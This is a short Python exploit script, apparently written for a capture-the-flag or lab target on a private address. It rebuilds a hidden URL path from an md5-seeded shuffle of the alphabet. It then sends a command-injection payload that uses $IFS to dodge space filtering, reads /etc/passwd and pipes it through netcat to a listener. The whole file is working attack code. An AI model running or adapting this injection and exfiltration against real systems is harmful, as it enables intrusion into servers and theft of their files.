#!/usr/bin/env ptyhon3
import os
import requests

from datetime import datetime, timezone

# %m.%d.%y
dataInfo = '04/23/2006'
'''
'4.23.6'
'''

date = datetime.strptime(dataInfo, "%m/%d/%Y")
UTC  = date.replace(tzinfo=timezone.utc).timestamp()

day = int(UTC) // 86400

cmd = "echo %d " % (day)
cmd += "| md5sum "
cmd += "| cut -d' ' -f1 "
cmd += "| awk '{ for(i=0;i<10;i++) printf \"%s\", $1 }' "
cmd += " > a "
os.popen(cmd)

cmd = "echo  \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\" "
cmd += "| grep -o . "
cmd += "| shuf --random-source ./a "
cmd += "| tr -d '\n'"

magic = os.popen(cmd)
magic = magic.read()
print(magic)


IP   = '192.168.232.134'
PORT = 1337

payload = 'cat$IFS$9/etc/passwd|nc$IFS$9192.168.232.134$IFS$91234;'
url = 'http://%s:%d//%s/%s' % (IP, PORT, magic, payload)
ret = requests.get(url = url)

